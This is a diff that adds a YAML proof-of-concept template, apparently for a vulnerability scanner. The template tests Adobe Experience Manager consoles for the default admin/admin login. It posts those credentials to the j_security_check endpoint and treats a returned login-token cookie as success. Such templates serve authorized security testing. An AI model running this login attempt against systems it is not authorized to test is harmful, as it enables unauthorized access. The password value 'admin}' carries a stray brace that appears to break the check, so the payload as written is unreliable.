@@ -1,0 +1,20 @@
+id: poc-yaml-aem-dashboard-weak-pass
+info:
+  name: Adobe Experience Manager (AEM) 控制台弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: AEM
+  osprey-id: vb_2022_0037
+requests:
+- method: POST
+  path: /libs/granite/core/content/login.html/j_security_check
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: _charset_=utf-8&j_username=admin&j_password=admin}&j_validate=true
+  expression: 'status_code == 200 && contains(headers, "Set-Cookie") && contains(headers,
+    "login-token=") && contains(headers, "crx.default")
+
+    '
+variables: {}
+transport: http
